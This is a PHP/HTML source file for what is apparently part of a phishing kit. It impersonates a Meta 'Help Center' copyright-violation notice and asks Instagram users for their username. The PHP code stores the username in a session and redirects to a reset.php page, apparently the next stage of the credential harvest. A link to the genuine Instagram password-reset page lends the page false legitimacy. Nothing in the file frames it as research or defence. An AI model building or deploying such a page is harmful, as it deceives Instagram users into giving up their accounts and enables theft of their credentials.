<?php
if ($_GET) {
    $username=$_GET["username"];
    session_start();
    $_SESSION["username"]=$username;
    header("location: reset.php?username=$username");
}


?>	
<!doctype html>
<html lang="en">
<head>
	<title>Copyright Violation</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	
	<div class="size1 bg0 where1-parent">
		<!-- Coutdown -->
		<div class="flex-c-m bg-img1 size2 where1 overlay1 where2 respon2" style="background-image: url('https://cdn.dribbble.com/users/5436944/screenshots/14812745/media/471a7676aa044cb8184576ea34017d9c.gif');">
			
		</div>
		
		<!-- Form -->
		<div class="size3 flex-col-sb flex-w p-l-75 p-r-75 p-t-45 p-b-45 respon1">
			<div class="wrap-pic1">
				
			</div>
<div align="center"><img class="center" src="images/logo.png" width="200" /></div><hr>
			<div class="p-t-50 p-b-60">
				<p class="m1-txt1 p-b-36">
					<span class="m1-txt2">Help Center | Meta</span><br>Copyright Violation
				</p>

				<form class="contact100-form validate-form">
					<div class="wrap-input100 m-b-10 validate-input" data-validate = "Username is required" method="post">
						<input class="s2-txt1 placeholder0 input100" type="username" name="username" placeholder="Username" minlength="6">
						<span class="focus-input100"></span>
					</div>

					<div class="w-full">
						<button class="flex-c-m s2-txt2 size4 bg1 bor1 hov1 trans-04">
							Contiune
						</button>
					</div>
				</form>

				<button class="s2-txt3 p-t-18" target="_blank" onclick="window.location='https://www.instagram.com/accounts/password/reset/';">
					Forgot your password? 				</button>
			</div>

			<div class="flex-w">
				
				
			</div>
		</div>
	</div>



	

<!--===============================================================================================-->	
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/moment.min.js"></script>
	<script src="vendor/countdowntime/moment-timezone.min.js"></script>
	<script src="vendor/countdowntime/moment-timezone-with-data.min.js"></script>
	<script src="vendor/countdowntime/countdowntime.js"></script>
	<script>
		$('.cd100').countdown100({
			/*Set Endtime here*/
			/*Endtime must be > current time*/
			endtimeYear: 0,
			endtimeMonth: 0,
			endtimeDate: 35,
			endtimeHours: 18,
			endtimeMinutes: 0,
			endtimeSeconds: 0,
			timeZone: "" 
			// ex:  timeZone: "America/New_York"
			//go to " http://momentjs.com/timezone/ " to get timezone
		});
	</script>
<!--===============================================================================================-->
	<script src="vendor/tilt/tilt.jquery.min.js"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>